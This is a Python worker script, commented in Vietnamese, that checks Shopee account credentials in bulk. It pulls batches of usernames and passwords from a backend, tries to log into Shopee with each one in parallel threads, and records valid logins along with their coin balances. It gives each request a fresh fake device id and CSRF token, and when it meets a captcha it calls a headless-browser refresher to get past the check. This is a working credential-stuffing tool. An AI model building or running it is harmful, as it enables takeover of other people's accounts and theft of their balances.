import os
import sys
import time
import json
import secrets
import string
import argparse
import threading
import concurrent.futures
from pathlib import Path
from typing import Dict, Any, Optional

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

# Thêm thư mục hiện tại vào sys.path
BASE_DIR = Path(__file__).resolve().parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from curl_cffi import requests as cffi_requests
from checker_engine.header_pool import HeaderPoolManager
from checker_engine.shopee_api import check_account_sync, get_user_coins_summary_sync
from checker_engine.header_refresher import HeaderRefresher
from checker_engine.logger import get_logger

logger = get_logger()

DEFAULT_API_URL = os.getenv("ARMS_API_URL", "http://localhost:4000/api")
DEFAULT_API_KEY = os.getenv("ARMS_API_KEY", "arms_apikey_3ef419721adcb5879a8385")

def gen_random_token(length: int = 32) -> str:
    """Sinh chuỗi ngẫu nhiên 32 ký tự alphanumeric cho SPC_F và csrftoken."""
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(length))

class ShopeeArmsSyncWorker:
    def __init__(
        self,
        api_url: str = DEFAULT_API_URL,
        api_key: str = DEFAULT_API_KEY,
        delay: float = 0.5,
        concurrency: int = 4
    ):
        self.api_url = api_url.rstrip("/")
        self.api_key = api_key
        self.delay = delay
        self.concurrency = max(1, concurrency)
        self.header_mgr = HeaderPoolManager()
        self.refresher = HeaderRefresher()
        self.is_running = True
        self._lock = threading.Lock()

    def _headers(self) -> Dict[str, str]:
        return {
            "Content-Type": "application/json",
            "x-arms-api-key": self.api_key
        }

    def send_heartbeat(self) -> bool:
        """Gửi tín hiệu trực chiến định kỳ về Backend ARMS."""
        url = f"{self.api_url}/accounts/checker/heartbeat"
        try:
            resp = cffi_requests.post(
                url,
                json={
                    "worker_name": "Shopee_ARMS_Worker",
                    "active_threads": self.concurrency,
                    "delay": self.delay
                },
                headers=self._headers(),
                timeout=5
            )
            return resp.status_code in (200, 201)
        except Exception as e:
            logger.debug(f"[Worker] Không thể gửi heartbeat tới Backend: {e}")
            return False

    def lease_accounts(self, batch_size: int = 10) -> Optional[Dict[str, Any]]:
        """Lấy lô tài khoản đang chờ kiểm tra từ ARMS Backend."""
        url = f"{self.api_url}/accounts/checker/lease"
        try:
            resp = cffi_requests.post(
                url,
                json={"batch_size": batch_size},
                headers=self._headers(),
                timeout=10
            )
            if resp.status_code in (200, 201):
                return resp.json()
            elif resp.status_code == 401:
                logger.error("[Worker] ❌ Lỗi xác thực API Key ARMS. Vui lòng kiểm tra lại x-arms-api-key.")
            else:
                logger.warning(f"[Worker] Lease API returned status {resp.status_code}: {resp.text}")
        except Exception as e:
            logger.debug(f"[Worker] Chưa kết nối được Backend ARMS ({url}): {e}")
        return None

    def report_single(self, result_payload: Dict[str, Any]) -> bool:
        """Gửi kết quả của một tài khoản về Backend ngay lập tức."""
        url = f"{self.api_url}/accounts/checker/report-single"
        try:
            resp = cffi_requests.post(
                url,
                json=result_payload,
                headers=self._headers(),
                timeout=10
            )
            return resp.status_code == 200 or resp.status_code == 201
        except Exception as e:
            logger.error(f"[Worker] Lỗi khi gửi kết quả về Backend: {e}")
            return False

    def build_shopee_request(self, base_header: Dict[str, Any]):
        """Sinh định danh thiết bị độc nhất (SPC_F & csrftoken) cho từng request."""
        random_spc_f = gen_random_token(32)
        random_csrf = gen_random_token(32)

        req_headers = {
            "accept": "application/json",
            "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://shopee.vn",
            "referer": "https://shopee.vn/buyer/login?next=https%3A%2F%2Fshopee.vn%2F",
            "sec-ch-ua": base_header.get("sec_ch_ua", '"Not=A?Brand";v="99", "Google Chrome";v="120", "Chromium";v="120"'),
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": base_header.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
            "x-api-source": "pc",
            "x-requested-with": "XMLHttpRequest",
            "x-shopee-language": "vi",
            "x-csrftoken": random_csrf,
            "x-sap-sec": base_header.get("x_sap_sec", ""),
            "af-ac-enc-sz-token": base_header.get("af_ac_enc_sz_token", "")
        }

        req_cookies = {
            "csrftoken": random_csrf,
            "SPC_F": random_spc_f
        }

        return req_headers, req_cookies, random_spc_f, random_csrf

    def check_single_account(self, acc: Dict[str, Any], base_header: Dict[str, Any]) -> bool:
        """Kiểm tra 1 tài khoản đơn lẻ và báo cáo kết quả về Backend."""
        username = acc.get("username")
        email = acc.get("email") or username
        password = acc.get("password", "")

        if not password:
            logger.warning(f"[{username}] Không có mật khẩu, đánh dấu lỗi thiếu pass.")
            self.report_single({
                "username": username,
                "email": email,
                "status": "WRONG_PASS",
                "error_code": 2,
                "error_msg": "Không có mật khẩu",
                "coins": 0,
                "elapsed_ms": 0,
                "raw_response": {"error": 2, "error_msg": "Thiếu mật khẩu"}
            })
            return True

        req_headers, req_cookies, spc_f, csrf = self.build_shopee_request(base_header)

        t0 = time.time()
        res = check_account_sync(
            email=email,
            password_plain=password,
            headers=req_headers,
            cookies=req_cookies,
            username=username,
            timeout=15
        )
        elapsed_ms = int((time.time() - t0) * 1000)

        # Lấy Shopee Xu nếu nick LIVE
        coins = 0
        if res.error_code == 0:
            try:
                coin_data = get_user_coins_summary_sync(
                    email=email,
                    cookies=res.cookies,
                    headers=req_headers,
                    timeout=5
                )
                coins = coin_data.get("user_coins", 0)
            except Exception:
                pass

        # Xử lý tự phục hồi (Auto-Heal) nếu gặp Captcha (mã 89) hoặc Header hết hạn (mã 1)
        if res.error_code in (89, 1):
            logger.warning(f"[Worker] ⚠️ Gặp mã {res.error_code}! Kích hoạt Playwright Header Refresher để làm mới Session...")
            with self._lock:
                try:
                    import asyncio
                    new_session = asyncio.run(self.refresher.capture_one_session("Auto_Heal_Session"))
                    if new_session:
                        self.header_mgr.load_pool()
                        logger.info("[Worker] ✅ Đã cập nhật Session Security mới thành công!")
                except Exception as ex:
                    logger.error(f"[Worker] Lỗi khi chạy Auto-Heal: {ex}")

        # Gửi kết quả về Backend ngay lập tức
        self.report_single({
            "username": username,
            "email": email,
            "status": res.status.value,
            "error_code": res.error_code,
            "error_msg": res.error_msg,
            "coins": coins,
            "elapsed_ms": elapsed_ms,
            "raw_response": res.response_raw
        })

        logger.info(f"[Worker] [{username}] -> {res.status.value} (Code: {res.error_code}, Coins: {coins}, {elapsed_ms}ms)")
        if self.delay > 0:
            time.sleep(self.delay)
        return True

    def run_once(self) -> int:
        """Thực thi một vòng kiểm tra: Lấy lô nick -> Check song song đa luồng -> Báo cáo."""
        batch_size = max(5, self.concurrency * 2)
        lease_data = self.lease_accounts(batch_size=batch_size)
        if not lease_data or not lease_data.get("is_running"):
            return 0

        accounts = lease_data.get("accounts", [])
        if not accounts:
            return 0

        logger.info(f"[Worker] Nhận lô {len(accounts)} tài khoản từ Backend (Phiên: {lease_data.get('session_id')}) - Xử lý {self.concurrency} luồng song song")
        base_header = self.header_mgr.headers_list[0] if self.header_mgr.headers_list else {}

        if self.concurrency > 1 and len(accounts) > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrency) as executor:
                futures = [executor.submit(self.check_single_account, acc, base_header) for acc in accounts]
                concurrent.futures.wait(futures)
            return len(accounts)
        else:
            for acc in accounts:
                self.check_single_account(acc, base_header)
            return len(accounts)

    def start_loop(self):
        """Vòng lặp chạy ngầm liên tục, định kỳ gửi heartbeat và kiểm tra tài khoản."""
        logger.info(f"🚀 Shopee ARMS Sync Worker đã khởi động! (Backend: {self.api_url}, {self.concurrency} luồng song song)")
        logger.info("   Đang lắng nghe các phiên kiểm tra từ Dashboard ARMS...")

        last_heartbeat_time = 0

        while self.is_running:
            try:
                now = time.time()
                if now - last_heartbeat_time >= 5.0:
                    self.send_heartbeat()
                    last_heartbeat_time = now

                processed = self.run_once()
                if processed == 0:
                    time.sleep(2.0)
            except KeyboardInterrupt:
                logger.info("[Worker] Nhận tín hiệu dừng từ người dùng.")
                break
            except Exception as e:
                logger.error(f"[Worker] Lỗi trong vòng lặp: {e}")
                time.sleep(3.0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shopee ARMS Sync Worker (Đa luồng song song)")
    parser.add_argument("--api-url", default=DEFAULT_API_URL, help="Backend ARMS API URL")
    parser.add_argument("--api-key", default=DEFAULT_API_KEY, help="ARMS API Key")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay giữa các nick (giây)")
    parser.add_argument("--concurrency", "--threads", type=int, default=4, help="Số luồng kiểm tra song song (mặc định: 4)")
    parser.add_argument("--once", action="store_true", help="Chạy một lượt rồi thoát")

    args = parser.parse_args()

    worker = ShopeeArmsSyncWorker(
        api_url=args.api_url,
        api_key=args.api_key,
        delay=args.delay,
        concurrency=args.concurrency
    )

    if args.once:
        worker.run_once()
    else:
        worker.start_loop()
